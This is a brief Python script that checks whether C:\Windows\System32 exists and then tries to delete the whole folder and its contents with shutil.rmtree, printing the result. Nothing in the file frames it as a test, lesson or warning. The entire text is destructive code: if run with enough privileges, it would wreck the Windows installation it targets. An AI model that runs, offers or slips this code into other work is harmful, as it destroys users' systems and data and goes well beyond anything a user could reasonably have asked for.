import shutil
import os

# Define the path to the System32 folder
system32_path = r"C:\Windows\System32"

# Check if the path exists
if os.path.exists(system32_path):
    try:
        # Attempt to remove the directory and its contents recursively
        shutil.rmtree(system32_path)
        print(f"Attempted to delete: {system32_path}")
    except OSError as e:
        print(f"Error deleting {system32_path}: {e}")
else:
    print(f"Path not found: {system32_path}")
